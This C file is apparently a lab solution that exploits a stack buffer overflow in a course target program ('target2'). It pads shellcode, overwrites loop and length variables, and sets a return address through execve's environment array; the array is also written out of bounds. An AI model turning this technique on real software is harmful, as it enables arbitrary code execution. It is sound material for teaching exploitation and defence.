#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include "shellcode-64.h"

#define TARGET "../targets/target2"

int
main ( int argc, char * argv[] )
{
	char *	args[3];
	char *	env[1];


        char large_string[271];
        int i;
        for(i = 0; i < strlen(shellcode); i++){
                large_string[i] = shellcode[i];
        }
        for(i = strlen(shellcode); i < 271; i++){
                large_string[i] = '0';
        }

	// overwrite "i" bytes of target2
	// i = 0x0000010b (first bytes skipped / not overwritten)
	large_string[264] = '\x0b';
	large_string[265] = '\x01';
    
	// overwrite 3 "len" bytes of target2
	// len = 0x??00011C
	large_string[268] = '\x1C';
	large_string[269] = '\x01';
	large_string[270] = '\x00';

        args[0] = TARGET;
        args[1] = large_string;
        args[2] = NULL;
    
	// finish overwriting len's bytes 
	// len = 0x00011c
	env[0] = &large_string[270]; //NULL

	// overwrite return address of 'foo' of target2, to be the start address of buf
	env[1] = "00000000\x40\xfd\x21\x20";
	

	if ( execve (TARGET, args, env) < 0 )
		fprintf (stderr, "execve failed.\n");

	return (0);
}
